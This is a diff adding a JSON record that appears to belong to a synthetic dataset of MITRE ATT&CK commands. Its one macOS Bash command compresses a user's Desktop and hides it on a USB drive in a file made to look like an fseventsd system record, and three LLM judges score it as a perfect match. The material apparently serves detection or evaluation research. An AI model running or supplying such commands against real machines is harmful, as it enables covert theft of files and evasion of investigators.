@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Desktop\" | dd of=\"/Volumes/USB/.fseventsd/0000000000000001\" bs=4m conv=sync,noerror && sync",
+  "explanation": "Streams a compressed archive of the Desktop into a file that resembles an fseventsd record on the removable drive, using dd for direct write.",
+  "rationale_steps": [
+    "Create a compressed stream of the target directory.",
+    "Use dd to place the stream into a plausible system metadata location on the USB.",
+    "Keep the action entirely local to the host.",
+    "Sync to finalize write operations."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-e6b00470",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed pipeline using tar to stdout and dd with valid options, balanced quoting, and proper separators.",
+        "semantic_score": 5,
+        "semantic_justification": "It gzip-archives the Desktop and writes it to a plausibly hidden file within a mounted USB volume, aligning with exfiltration over a physical medium and obfuscation, assuming the target path exists.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:13:04.012627Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for both tar and dd commands, and correct use of command piping and logical operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements the T1052 technique by compressing the Desktop directory and writing it to a hidden-looking file on a USB drive that mimics system files to avoid detection, with the sync ensuring data is fully written before removal.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:13:07.114483Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, proper command separators, and no discernible syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by compressing sensitive data, streaming it to a physical medium (USB drive), and attempting to evade detection by naming the output file as a system log entry, all while ensuring data is written before removal.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:13:17.242444Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
